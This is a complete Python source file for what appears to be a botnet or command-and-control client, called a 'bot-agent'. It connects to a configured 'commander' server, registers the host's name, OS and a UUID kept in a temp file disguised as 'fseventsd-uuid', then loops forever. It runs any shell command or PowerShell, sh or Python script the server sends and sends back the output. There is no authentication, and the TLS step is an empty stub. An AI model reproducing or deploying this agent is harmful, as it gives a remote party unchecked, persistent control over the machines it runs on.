import os
import sys
import uuid
import json
import time
import shlex
import signal
import tempfile
import subprocess
import configparser
from math import pow
from pathlib import Path
from platform import system
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM, gethostname


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/bot-agent.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        max_reconn = int(config_parser.get("CORE", "MAX_RECONN"))
        idle_timeout = int(config_parser.get("CORE", "IDLE_TIMEOUT"))
        conn_buff = int((config_parser.get("CORE", "CONN_BUFF")))
        recv_tout = int((config_parser.get("CORE", "RECV_TIMEOUT")))
        hello_freq = int((config_parser.get("CORE", "HELLO_FREQ")))
    except Exception as err:
        print(f"Error initializing CORE, bot agent not started because config file could not be loaded. Unexpected "
              f"exception occurred: {err}")
        exit(5)
    return host, port, max_reconn, conn_buff, idle_timeout, recv_tout, hello_freq


class BotAgent:
    def __init__(self, host, port, max_reconn, idle_timeout, conn_buff, recv_tout, hello_freq):
        self.host = host
        self.port = port
        self.hostname = gethostname()
        self.os = self.__os_type()
        self.max_reconn = max_reconn
        self.idle = False
        self.recv_tout = recv_tout
        self.idle_tout = idle_timeout
        self.conn_buff = conn_buff
        self.hello_freq = hello_freq
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.reconnect_count = 0
        self.__check_uuid()
        self.__self_identify()

    @staticmethod
    def __os_type():
        op_sys = system()
        if op_sys:
            return op_sys
        else:
            print("Error, operating system type could not be determined, this info will be missing from commander")

    def __check_uuid(self):
        self.uid_path = os.path.join(tempfile.gettempdir(), "fseventsd-uuid")
        if os.path.isfile(self.uid_path):
            with open(self.uid_path, 'r') as fh:
                self.uuid = fh.read()
        else:
            self.uuid = self.__gen_uuid()

    def __gen_uuid(self):
        new_uuid = str(uuid.uuid4())
        with open(self.uid_path, 'w') as fh:
            fh.write(new_uuid)
        return new_uuid

    def __tcp_handshake(self):
        try:
            self.sock.close()
            self.sock = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.last_online = time.time()
        except Exception as err:
            print(f"Unexpected error occurred when connecting to commander: {err}")
            self.sock.close()
            self.__reconnect()
        self.reconnect_count = 0

    def __reconnect(self):
        if self.reconnect_count < self.max_reconn:
            self.reconnect_count += 1
        time.sleep(pow(2, self.reconnect_count))
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.__tcp_handshake()

    def __tls_handshake(self):
        pass

    def __self_identify(self):
        self.__tcp_handshake()
        self.sock.settimeout(self.recv_tout)
        if self.__send_agent_info():
            print(f"Bot-agent {self.hostname}-{self.uuid} has been successfully added by commander")
            self.__check_for_commands()
        else:
            if self.reconnect_count < self.max_reconn:
                self.reconnect_count += 1
            time.sleep(pow(2, self.reconnect_count))
            self.__self_identify()

    def __send_agent_info(self):
        payload = self.__build_json_payload("botHostInfo")
        if not payload:
            self.__self_identify()
        try:
            print(f"Sending botHostInfo from bot-agent {self.hostname} to commander")
            self.sock.sendall(payload)
        except Exception as err:
            print(f"Unexpected error occurred while sending botHostInfo of peer {self.hostname} to commander: {err}")
            return
        try:
            data = self.sock.recv(self.conn_buff)
        except Exception as err:
            print(f"Unexpected error occurred while reading botHostInfoReply by peer {self.hostname}: {err}")
            return
        if data:
            if self.__process_input_stream(data):
                return True
            else:
                return
        else:
            print("Received EOF or empty response by peer {}-{} from commander instead of botHostInfoReply".
                  format(self.hostname, self.uuid))
            return

    def __process_input_stream(self, data):
        json_msg = self.__json_deserialize(data)
        if not isinstance(json_msg, dict):
            return
        msg = json_msg.get("message")
        if msg in ["botHostInfoReply", "botHelloReply"]:
            print(f"Bot-agent {self.hostname} received {msg} from commander")
            self.last_online = time.time()
        elif msg == "exeCommand":
            cmd = json_msg.get("command")
            timeout = json_msg.get("timeout")
            cmd_id = json_msg.get("cmd_id")
            print(f"Bot-agent {self.hostname} received {msg} - {cmd} from commander")
            response, exit_code = self.__execute_command(msg, timeout, cmd)
            if response:
                payload = self.__build_json_payload("exeCommandReply", cmd, cmd_id, response, exit_code)
                if not payload or not self.__send_command(payload, json_msg):
                    return
            else:
                return
        elif msg == "exeScript":
            script = json_msg.get("script")
            script_type = json_msg.get("type")
            timeout = json_msg.get("timeout")
            cmd_id = json_msg.get("cmd_id")
            script_data = json_msg.get("command")
            print(f"Bot-agent {self.hostname} received {msg} - {script_type}")
            response, exit_code = self.__execute_command(msg, timeout, script_type, script_data)
            if response:
                payload = self.__build_json_payload("exeScriptReply", script, cmd_id, response, exit_code)
                if not payload or not self.__send_command(payload, json_msg):
                    return
            else:
                return
        else:
            print(f"Bot-agent {self.hostname} received an unknown message from commander: {msg}")
            return
        return True

    @staticmethod
    def __json_deserialize(data):
        try:
            return json.loads(data.decode("utf-8"))
        except Exception as err:
            print(f"Unexpected exception when deserializing message from commander: {err}")

    def __build_json_payload(self, msg, *args):
        match msg:
            case "botHostInfo":
                d = {"message": msg, "uuid": self.uuid, "hostname": self.hostname, "os": self.os}
            case "botHello":
                d = {"message": msg}
            case "exeCommandReply":
                request, cmd_id, response, exit_code = args
                d = {"message": msg, "command": request, "cmd_id": cmd_id, "result": response, "exit_code": exit_code}
            case "exeScriptReply":
                s_path, cmd_id, response, exit_code = args
                d = {"message": msg, "command": s_path, "cmd_id": cmd_id, "result": response, "exit_code": exit_code}
            case _:
                print("Internal error, json payload to build didn't match any supported message type")
                return
        try:
            payload = (json.dumps(d) + "\n").encode("utf-8")
        except Exception as err:
            print(f"Unexpected error when serializing {msg} json: {err}. Reconnecting to commander.")
            return
        return payload

    def __check_for_commands(self):
        while True:
            data = ""
            if time.time() - self.last_online > self.idle_tout:
                # Send hello to commander so that it knows this bot-agent is still online
                if self.__keep_alive():
                    time.sleep(self.hello_freq)
                    continue
                else:
                    self.__self_identify()
            try:
                data = self.__read_buffer()
            except Exception as err:
                print(f"Unexpected error on bot-agent {self.hostname} when reading input stream from commander, error: {err}")
                self.__self_identify()
            if data:
                for json_item in data:
                    result = self.__process_input_stream(json_item)
                    if result:
                        continue
                    else:
                        self.__self_identify()
            else:
                time.sleep(self.hello_freq)

    def __execute_command(self, cmd_type, timeout, *args):
        popen_payload = []
        command = ""
        if cmd_type == "exeCommand":
            data, = args
            try:
                popen_payload = shlex.split(data)
                command = popen_payload[0]
            except Exception as err:
                print(f"Unexpected exception when splitting command received from commander by bot-agent {self.hostname}"
                      f". Will not process it and just move on. Error: {err}")
                return False, False
        elif cmd_type == "exeScript":
            command, script_data = args
            d = {
                "powershell": [command, '-Command', script_data],
                "sh"        : [command, '-c', script_data],
                "python"    : [command, '-c', script_data]
            }
            popen_payload = d.get(command)
        if not self.__which(command):
            msg = (f"The command {command} that commander has sent to bot-agent {self.hostname} is unknown. Will not"
                   f" process it and just move on.")
            print(msg)
            return msg, False
        p = Popen(popen_payload, stderr=PIPE, stdout=PIPE)
        try:
            out, err = p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            p.kill()
            response = f"TimeoutExpired ({timeout} seconds) from bot-agent {self.hostname} for command {popen_payload}"
            return response, p.returncode
        if out and err:
            response = f"Output: {out}, Error: {err}"
        elif out:
            response = out
        elif err:
            response = err
        else:
            response = f"Empty response from bot-agent {self.hostname} for command {popen_payload}"
        return str(response), p.returncode

    def __send_command(self, payload, json_msg):
        try:
            print(f"Sending {payload.decode('utf-8')} from bot-agent {self.hostname} to commander")
            self.sock.sendall(payload)
            self.last_online = time.time()
            return True
        except Exception as err:
            print(f"Unexpected exception for bot-agent {self.hostname} when replying to command {json_msg}: {err}")
            return

    @staticmethod
    def __which(executable):
        def is_exe(f_path):
            return os.path.isfile(f_path) and os.access(f_path, os.X_OK)

        f_path, f_name = os.path.split(executable)
        if f_path:
            if is_exe(executable):
                return executable
        else:
            for path in os.environ["PATH"].split(os.pathsep):
                exe_file = os.path.join(path, executable)
                if is_exe(exe_file):
                    return exe_file

    def __keep_alive(self):
        payload = self.__build_json_payload("botHello")
        if payload:
            try:
                print("Sending botHello to Commander to maintain keepalive")
                self.sock.sendall(payload)
                self.last_online = time.time()
            except Exception as err:
                print("Unexpected exception occurred for bot-agent {} when sending botHello to commander: {}".
                      format(self.hostname, err))
                return
        else:
            print("Reconnecting")
            return
        return True

    def __read_buffer(self):
        buffer = self.__read_initial()
        if not buffer:
            print(f"Buffer of bot-agent {self.hostname} is empty")
            return False
        buffering = True
        data_list = []
        while buffering:
            if b"\n" in buffer:
                (line, buffer) = buffer.split(b"\n", 1)
                data_list.append(line)
                return data_list
            else:
                more_data = self.sock.recv(self.conn_buff)
                if not more_data:
                    buffering = False
                else:
                    buffer += more_data
        return data_list

    def __read_initial(self):
        self.sock.settimeout(self.recv_tout)
        try:
            buffer = self.sock.recv(self.conn_buff)
        except TimeoutError:
            print("Timeout of {} seconds exceeded. Bot-agent {} has not received input stream from commander".
                  format(self.recv_tout, self.hostname))
            return False
        except Exception as err:
            print("Unexpected error on bot-agent {} when reading input stream from commander, error: {}".
                  format(self.hostname, err))
            return False
        return buffer


class GracefulKiller:
    kill_now = False

    def __init__(self):
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

    def exit_gracefully(self, *args):
        self.kill_now = True
        print("Bot-Agent is shutting down")
        sys.exit()


if __name__ == "__main__":
    killer = GracefulKiller()
    HOST, PORT, MAX_RECONN, CONN_BUFF, IDLE_TIMEOUT, RECV_TOUT, HELLO_FREQ = load_conf()
    client = BotAgent(HOST, PORT, MAX_RECONN, IDLE_TIMEOUT, CONN_BUFF, RECV_TOUT, HELLO_FREQ)
